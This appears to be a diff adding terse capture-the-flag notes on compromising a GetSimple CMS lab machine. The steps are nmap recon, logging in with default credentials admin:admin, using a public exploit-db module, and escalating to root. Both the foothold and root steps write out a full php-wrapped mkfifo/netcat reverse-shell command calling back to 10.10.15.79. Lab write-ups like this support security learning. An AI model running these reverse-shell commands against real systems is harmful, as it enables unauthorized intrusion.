@@ -1,0 +1,28 @@
+# recon
+## nmap
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Welcome to GetSimple! - gettingstarted
+| http-robots.txt: 1 disallowed entry
+|_/admin/
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+
+# enum
+## 80
+checking the default page => RTFSC => http://gettingstarted.htb/ => adding it to /etc/hosts => same webpage
+"GetSimple", google => found https://www.exploit-db.com/exploits/40008 exploit for version 3.3.10. But need admin cred.
+
+checking the /admin/ => a login page
+tried admin:admin => login!
+in the support page => veresion 3.3.15
+goole, found this msf https://www.exploit-db.com/exploits/46880
+=> try it => got in!
+
+# foothold
+whoami => www-data
+sudo -l => /usr/bin/php -r "system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.79 8888 >/tmp/f');"
+=> got a normal shell
+
+## www-data -> root
+/usr/bin/php -r "system('su; rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.79 9999 >/tmp/f');"
+=> got a root
+(Actually I can directly do this step to get a root shell. No need to get a normal shell of www-data.)
